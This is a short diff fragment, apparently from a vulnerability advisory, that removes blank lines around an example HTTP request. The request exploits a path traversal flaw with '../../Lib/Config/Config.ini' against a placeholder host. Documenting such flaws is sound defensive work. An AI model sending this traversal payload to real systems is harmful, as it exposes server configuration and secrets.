@@ -29,8 +29,6 @@ $Html = file_get_contents($FilePath);
 
 Exploitation: HTTP Request Examples
 GET /admin/templates/edit.html?Name=../../Lib/Config/Config.ini HTTP/1.1
-
 Host: vulnerable-website.com
-
 Cookie:<session_cookie>
 
